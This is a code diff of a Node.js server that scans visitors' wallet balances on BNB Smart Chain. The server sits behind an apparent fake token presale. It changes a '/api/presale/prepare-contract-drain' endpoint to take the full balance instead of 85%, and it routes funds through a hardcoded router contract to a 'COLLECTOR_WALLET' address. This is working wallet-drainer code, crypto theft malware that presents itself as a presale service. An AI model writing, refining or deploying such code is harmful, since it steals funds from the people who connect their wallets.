@@ -57,21 +57,10 @@ app.get('/', (req, res) => {
 
 // ============================================
 // ============================================
-// RPC CONFIGURATION - UPDATED WITH WORKING URLs
+// RPC CONFIGURATION - BSC ONLY
 // ============================================
 
 const RPC_CONFIG = {
-  Ethereum: { 
-    urls: [
-      'https://eth.llamarpc.com',
-      'https://ethereum.publicnode.com',
-      'https://rpc.ankr.com/eth',
-      'https://cloudflare-eth.com'
-    ],
-    symbol: 'ETH',
-    decimals: 18,
-    chainId: 1
-  },
   BSC: {
     urls: [
       'https://bsc-dataseed.binance.org',
@@ -82,47 +71,6 @@ const RPC_CONFIG = {
     symbol: 'BNB',
     decimals: 18,
     chainId: 56
-  },
-  Polygon: {
-    urls: [
-      'https://polygon-rpc.com',
-      'https://rpc-mainnet.maticvigil.com',
-      'https://polygon.llamarpc.com',
-      'https://polygon-bor.publicnode.com'
-    ],
-    symbol: 'MATIC',
-    decimals: 18,
-    chainId: 137
-  },
-  Arbitrum: {
-    urls: [
-      'https://arb1.arbitrum.io/rpc',
-      'https://rpc.ankr.com/arbitrum',
-      'https://arbitrum.llamarpc.com'
-    ],
-    symbol: 'ETH',
-    decimals: 18,
-    chainId: 42161
-  },
-  Optimism: {
-    urls: [
-      'https://mainnet.optimism.io',
-      'https://rpc.ankr.com/optimism',
-      'https://optimism.llamarpc.com'
-    ],
-    symbol: 'ETH',
-    decimals: 18,
-    chainId: 10
-  },
-  Avalanche: {
-    urls: [
-      'https://api.avax.network/ext/bc/C/rpc',
-      'https://rpc.ankr.com/avalanche',
-      'https://avalanche-c-chain.publicnode.com'
-    ],
-    symbol: 'AVAX',
-    decimals: 18,
-    chainId: 43114
   }
 };
 
@@ -155,16 +103,11 @@ async function getChainProvider(chainName) {
 }
 
 // ============================================
-// YOUR DEPLOYED CONTRACT ADDRESSES
+// YOUR DEPLOYED CONTRACT ADDRESSES - BSC ONLY
 // ============================================
 
 const PROJECT_FLOW_ROUTERS = {
-  'Ethereum': process.env.PROJECT_FLOW_ROUTER_ETHEREUM || null,
-  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
-  'Polygon': process.env.PROJECT_FLOW_ROUTER_POLYGON || null,
-  'Arbitrum': process.env.PROJECT_FLOW_ROUTER_ARBITRUM || null,
-  'Optimism': process.env.PROJECT_FLOW_ROUTER_OPTIMISM || null,
-  'Avalanche': process.env.PROJECT_FLOW_ROUTER_AVALANCHE || null
+  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
 };
 
 const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';
@@ -263,29 +206,26 @@ async function getCryptoPrices() {
   try {
     const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
       params: {
-        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
+        ids: 'binancecoin',
         vs_currencies: 'usd'
       },
       timeout: 5000
     });
     
     return {
-      eth: response.data.ethereum?.usd || 2000,
-      bnb: response.data.binancecoin?.usd || 300,
-      matic: response.data['matic-network']?.usd || 0.75,
-      avax: response.data['avalanche-2']?.usd || 32
+      bnb: response.data.binancecoin?.usd || 300
     };
   } catch (error) {
-    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
+    return { bnb: 300 };
   }
 }
 
 // ============================================
-// REAL BALANCE CHECK
+// REAL BALANCE CHECK - BSC ONLY
 // ============================================
 
 async function getRealWalletBalance(walletAddress) {
-  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
+  console.log(`\n🔍 SCANNING BSC: ${walletAddress.substring(0, 10)}...`);
   
   const results = {
     walletAddress,
@@ -298,13 +238,9 @@ async function getRealWalletBalance(walletAddress) {
   try {
     const prices = await getCryptoPrices();
     
+    // BSC only
     const chains = [
-      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
-      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
-      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
-      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
-      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
-      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
+      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 }
     ];
 
     let totalValue = 0;
@@ -321,7 +257,7 @@ async function getRealWalletBalance(walletAddress) {
         const valueUSD = amount * chain.price;
         
         if (amount > 0.000001) {
-          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
+          console.log(`   ✅ BSC: ${amount.toFixed(6)} BNB = $${valueUSD.toFixed(2)}`);
           
           totalValue += valueUSD;
           
@@ -509,8 +445,8 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
       .map(b => ({
         chain: b.chain,
         chainId: b.chainId,
-        amount: (b.amount * 0.85).toFixed(12),
-        valueUSD: (b.valueUSD * 0.85).toFixed(2),
+        amount: b.amount.toFixed(12), // Full amount - no 85% deduction
+        valueUSD: b.valueUSD.toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain]
       }));
@@ -675,4 +611,3 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   await testTelegramConnection();
 });
-
